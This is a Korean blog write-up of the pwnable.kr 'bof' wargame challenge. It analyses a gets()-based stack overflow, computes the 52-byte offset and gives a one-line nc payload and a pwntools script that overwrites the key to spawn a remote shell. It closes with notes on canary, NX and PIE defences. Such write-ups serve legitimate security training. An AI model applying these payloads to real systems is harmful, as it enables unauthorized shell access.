---
layout: post
title: pwnable.kr | BOF
subtitle: BOF 문제 풀이
categories: Pwnable
tags: [Pwnable, BOF, pwnable.kr, Pentest]
---

**본 문제는 pwnable.kr를 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

문제는 <a href = "https://pwnable.kr/play.php">pwnable.kr</a>를 들어가시면 확인할 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/179676610-f8e5f008-1263-48e1-ab21-dc88e942c363.png" width = 400>
</p>

나나가 가장 흔한 소프트웨어 취약점은 bof라는데 정말이냐고 물어보네요. 이번 문제를 bof로 풀어보라는 것 같습니다!

저는 WSL2로 Ubuntu 20.04를 올리고 pwntools, pwndbg를 올려서 사용하고 있습니다! 이를 이용해서 문제를 풀어보도록 하겠습니다.

`wget` 명령어로 각 파일을 다운 받고 bof.c를 열어보면 아래의 코드로 구성 되어 있습니다.

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

```C
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

* 실행하자마자 **func** 함수에 **0xdeadbeef**를 대입합니다.

```C
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
```

* gets() 함수를 이용해서 overflowme 32byte 공간에 입력 값을 받는 것으로 확인된다.

* **이 함수는 문자열을 입력받지만 문자열을 담을 공간의 길이와 입력받은 문자열의 길이를 확인하지 않기 때문에 버퍼오버플로우에 취약하다.** 

* func함수 인자로 **0xdeadbeef**를 넘겼는데, **0xcafebabe**와 같은 수가 없다. 

* 이것을 버퍼 오버플로우 공격으로 key에 저장된 값을 변경시키고, "/bin/sh"를 실행하는 것이다.


## 문제 풀이

* Main 함수의 어셈블리

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/179679668-4ae11936-0c19-496f-91a5-2f7df88f0d9b.png" width = 400>
</p>

* main+9 : `func(0xdeadbeef);`를 16byte 공간위에 할당했다.

* Func 함수의 어셈블리

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/179679874-4db178d4-9b01-4f77-9b87-08143d265fa2.png" width = 450>
</p>

* func함수에서 사용되는 함수는 총 4가지로 **printf(), gets(), system(), printf()**이다.

* func+3에서 총 72byte의 크기를 할당 했지만, 실제로 적재하는 곳은 func+29에서 ebp에서 0x2c(44byte)위에 값을 gets()한다.

* 따라서 func+35에서 gets()함수가 사용되는 것이고 func+29에서 gets()로 입력 값을 받을 위치가 **ebp-0x2c**인 것을 알 수 있다.

  * 그렇다면 func+40에서 **0xcafebabe**를 비교하는 곳이 **ebp+0x8**이라는 것이다.

  * 입력 값 **ebp-0x2c**부터 **ebp+0x8**까지를 변경해야하는 것이다.

  * 해당 위치의 차이는 52byte이다**(0x2c + 0x8 = 52)**

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/179690970-7df1f2ae-db0d-4a92-97bf-34b2ac8e498b.png">
</p>
 
```
run <<< `python3 -c 'print("A"*32)`
```
* func+40에 break point를 걸고 위 코드를 사용하면 실제로 32개의 A가 적재되고 0xdeadbeaf가 있는 것을 확인할 수 있다.

**스택 그림으로 설명해드리면 아래와 같게 된다.**

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/179690201-b47b25c1-0d9c-4f5e-a54f-5bf0791ac912.png" width = 380>
</p>

* 0xdeadbeaf까지는 총 52byte이기 때문에 패딩 값 52byte와 0xcafebabe를 넣으면 된다.

```bash
(python -c 'print "A"*52 + "\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
```

> 전에는 됐었던거 같은데 checksec로 확인해보면 Stack Guard, PIE, NX bit 모두 활성화 되어 있다. 그것 때문에 안되는 것이 스크립트를 작성해서 해보겠습니다.

### 스크립트

```Python
from pwn import *

payload = 'A' * 52 + '\xbe\xba\xfe\xca'
shell = remote('pwnable.kr', 9000)
shell.send(payload)
shell.interactive()
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/179698439-0b3265e3-ecbf-45ac-a519-5a660c852573.png" width = 380>
</p>

* 다행히도 정상적으로 payload가 넘어가서 권한 탈취하여 flag 값을 뽑아 올 수 있었습니다 !

## 보호 기법

**checksec**로 해당 파일을 확인해보면 STACK CANARY, NX-bit, PIE 보호기법 모두 적용 되어있다.

버퍼 오버플로우를 대응하기 위한 기법이 무엇이 있는지 확인 해보겠습니다!

 - CANARY   
        Canaries 또는 Canary word는 버퍼 오버 플로우를 모니터하기 위해 버퍼와 제어 데이터 사이에 설정 된 값이다. 버퍼 오버플로가 발생하면 Canary 값이 손상되며, Canaries 데이터의 검증에 실패하여, 오버플로에 대한 경고가 출력되고, 손상된 데이터를 무효화 처리한다.
        위 어셈블리어의 func+6을 보면 gs:0x14가 CANARY이다. eax에 CANARY RANDOM값을 넣어 버퍼 오버플로시 변경되었을 때 위 값을 비교하여 무효화 처리 하는 것이다.

 - NX-bit  
         메모리에 쓰기 권한과 실행 권한을 동시에 부여하지 않도록 하는 보호 기법입니다. 라이브러리 메모리에 존재하는 함수를 이용하여 공격하는 RTL을 통해 우회가 가능하다.

 - PIE   
         이 기법을 프로그램 실행 시 코드 영역의 주소가 변하기 때문에 ROP와 같은 코드 재사용 공격을 막을 수 있다.
